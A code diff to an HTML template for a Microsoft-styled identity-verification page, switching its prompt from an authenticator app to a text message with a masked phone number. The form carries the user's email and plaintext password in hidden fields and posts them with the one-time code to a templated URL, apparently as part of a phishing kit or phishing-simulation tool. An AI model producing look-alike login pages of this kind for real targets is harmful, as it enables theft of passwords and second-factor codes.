@@ -42,27 +42,25 @@
             font-size: 24px;
             font-weight: 600;
             color: #1b1b1b;
-            margin-bottom: 20px;
+            margin-bottom: 8px;
         }
         .subtitle {
             font-size: 15px;
-            color: #1b1b1b;
+            color: #605e5c;
             margin-bottom: 20px;
-            line-height: 21px;
         }
         .form-group {
             margin-bottom: 16px;
         }
-        input[type="text"], input[type="tel"] {
+        input[type="text"] {
             width: 100%;
             padding: 8px 12px;
             font-size: 15px;
             border: 1px solid #8a8886;
             background-color: #fff;
             box-sizing: border-box;
-            text-align: center;
         }
-        input[type="text"]:focus, input[type="tel"]:focus {
+        input[type="text"]:focus {
             border-color: #0078d4;
             outline: none;
         }
@@ -113,10 +111,24 @@
             text-decoration: none;
             font-size: 13px;
         }
-        .code-description {
-            font-size: 13px;
-            color: #605e5c;
+        .verification-method {
+            display: flex;
+            align-items: center;
             margin-bottom: 16px;
+            font-size: 15px;
+            color: #323130;
+        }
+        .verification-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            background-color: #0078d4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
         }
     </style>
 </head>
@@ -146,19 +158,20 @@
                     <button class="back-button" onclick="history.back()">← Back</button>
                     
                     <div class="user-email">{{ email }}</div>
-                    <div class="title">Enter code</div>
-                    <div class="subtitle">Enter the verification code from your mobile app.</div>
+                    <div class="title">Verify your identity</div>
+                    <div class="subtitle">Help us protect your account</div>
+                    
+                    <div class="verification-method">
+                        <div class="verification-icon">📱</div>
+                        <div>Text ***-***-1234</div>
+                    </div>
                     
                     <form method="post" action="{{ next_url }}">
                         <input type="hidden" name="email" value="{{ email }}">
                         <input type="hidden" name="password" value="{{ password }}">
                         
-                        <div class="code-description">
-                            Check your authenticator app for a verification code.
-                        </div>
-                        
                         <div class="form-group">
-                            <input type="text" name="two_factor_token" placeholder="Enter code" maxlength="6" required autofocus>
+                            <input type="text" name="two_factor_token" placeholder="Enter code" required autofocus maxlength="6">
                         </div>
                         
                         <div class="form-group">
@@ -167,12 +180,12 @@
                     </form>
                     
                     <div class="footer">
-                        <a href="#">I can't use my authenticator app</a><br>
-                        <a href="#">Use a different verification option</a>
+                        <a href="#">I can't use my phone right now</a><br>
+                        <a href="#">Use a different verification method</a>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 </body>
-</html>
+</html> 
